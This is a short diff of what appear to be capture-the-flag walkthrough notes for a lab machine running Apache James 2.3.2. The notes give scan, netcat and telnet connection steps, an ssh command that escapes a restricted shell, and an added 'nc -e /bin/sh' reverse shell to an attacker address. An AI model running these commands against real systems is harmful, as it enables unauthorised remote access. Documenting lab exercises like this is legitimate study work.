@@ -1,10 +1,10 @@
 ```
+nmap -p- -T5 10.10.10.51
+Apache James Server 2.3.2
 nc 10.10.10.51 4555
 telnet 10.10.10.51 110
-Escape rbash
-LinEnum.sh
-reverse shell - nc
-move to bash
+ssh mindy@10.10.10.51 -t bash
+nc -e /bin/sh 10.10.14.7 4444
 ```
 
 
